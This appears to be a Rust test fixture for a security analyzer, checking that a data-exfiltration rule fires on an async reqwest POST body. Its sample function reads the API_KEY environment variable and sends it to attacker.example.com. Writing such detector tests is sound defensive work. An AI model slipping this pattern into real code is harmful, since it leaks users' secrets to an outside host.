// Async DATA_EXFIL: `client.post(URL).body(payload).send().await` must
// preserve the cap split identically to the synchronous `.send()` case
// in `data_exfil_reqwest_body.rs`.  The chained-call normalization
// collapses `.send().await` to the body-binding chain matcher (the
// peel-identity-suffix step strips `.await` before suffix matching) so
// DATA_EXFIL fires on the body channel.  URL is hardcoded, so SSRF must
// not fire.
async fn leak_secret_async() {
    let secret = std::env::var("API_KEY").unwrap();
    let _ = reqwest::Client::new()
        .post("https://attacker.example.com/collect")
        .body(secret)
        .send()
        .await;
}
